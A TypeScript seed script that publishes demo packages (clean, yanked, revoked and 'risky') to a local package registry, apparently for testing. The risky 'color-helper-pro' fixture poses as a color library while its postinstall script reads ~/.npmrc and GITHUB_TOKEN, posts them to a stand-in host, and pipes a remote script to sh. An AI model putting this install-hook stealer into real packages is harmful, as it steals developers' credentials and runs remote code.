// Seeds a running registry (APM_REGISTRY) with demo packages: clean, risky, yanked and revoked.
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { addUser, makeSandbox, writePackage, run, type Registry } from "../tests/acceptance/harness.ts";

const url = (process.env.APM_REGISTRY ?? "http://127.0.0.1:4873/").replace(/\/?$/, "/");
const reg: Registry = { url, dataDir: "", stop: async () => {} };
const work = mkdtempSync(join(tmpdir(), "apm-seed-"));
const PASSWORD = "demo-password-123";
const leo = await addUser(reg, "leo", PASSWORD);
const sam = await addUser(reg, "sam", PASSWORD);

async function pub(token: string, spec: Parameters<typeof writePackage>[1]): Promise<void> {
  const sb = makeSandbox(reg, token);
  const d = writePackage(work, spec, reg, token);
  const r = await run(["bun", "publish"], { cwd: d, env: sb.env });
  process.stdout.write(`${r.code === 0 ? "ok  " : "FAIL"} ${spec.name}@${spec.version}${r.code === 0 ? "" : `\n${r.out}`}\n`);
}
async function api(path: string, token: string, body: unknown): Promise<void> {
  const res = await fetch(`${url}-/apm/v1/${path}`, { method: "POST", headers: { "content-type": "application/json", authorization: `Bearer ${token}` }, body: JSON.stringify(body) });
  process.stdout.write(`${res.status} ${path} ${JSON.stringify(body).slice(0, 80)}\n`);
}

const typed = { "index.js": "export const slugify = (s) => s.toLowerCase().trim().replace(/[^a-z0-9]+/g, '-');\n", "index.d.ts": "export declare const slugify: (s: string) => string;\n", "README.md": "# tiny-slug\n\nTurn any string into a URL slug.\n\n```js\nimport { slugify } from 'tiny-slug'\nslugify('Hello World') // 'hello-world'\n```\n" };
for (const v of ["1.0.0", "1.1.0", "1.2.0", "1.3.0"]) await pub(leo, { name: "tiny-slug", version: v, files: typed, extra: { type: "module", types: "index.d.ts", description: "Turn any string into a URL slug", keywords: ["slug", "url", "string"], repository: "github:leo/tiny-slug" } });
await api("yank", leo, { name: "tiny-slug", version: "1.2.0", reason: "broke the CJS build" });
for (const v of ["2.0.0", "2.0.1"]) await pub(leo, { name: "@leo/date-format-lite", version: v, extra: { description: "Format dates without a locale database", keywords: ["date", "format"] } });
await api("revoke", leo, { name: "@leo/date-format-lite", version: "2.0.1", reason: "publish token stolen; 2.0.1 contains a credential stealer", password: PASSWORD });
await pub(sam, {
  name: "color-helper-pro",
  version: "0.4.0",
  scripts: { postinstall: "node setup.js" },
  extra: { description: "Color utilities for terminals" },
  files: { "index.js": "module.exports = {};\n", "setup.js": "const os=require('os');const fs=require('fs');\nconst t=fs.readFileSync(os.homedir()+'/.npmrc','utf8');\nfetch('https://collect.example.net/x',{method:'POST',body:JSON.stringify({t,env:process.env.GITHUB_TOKEN})});\nrequire('child_process').execSync('curl -s https://collect.example.net/s.sh | sh');\n" },
});
await pub(sam, { name: "@sam/ui-tokens", version: "3.2.0", extra: { description: "Design tokens for Sam's apps", exports: { ".": { import: "./index.mjs", require: "./index.js", types: "./index.d.ts" } } }, files: { "index.js": "module.exports={};\n", "index.mjs": "export {};\n", "index.d.ts": "export {};\n" } });
await pub(leo, { name: "slug-utils", version: "0.1.0", dependencies: { "tiny-slug": "^1.0.0" }, extra: { description: "More slug helpers built on tiny-slug" } });
process.stdout.write("seeded\n");
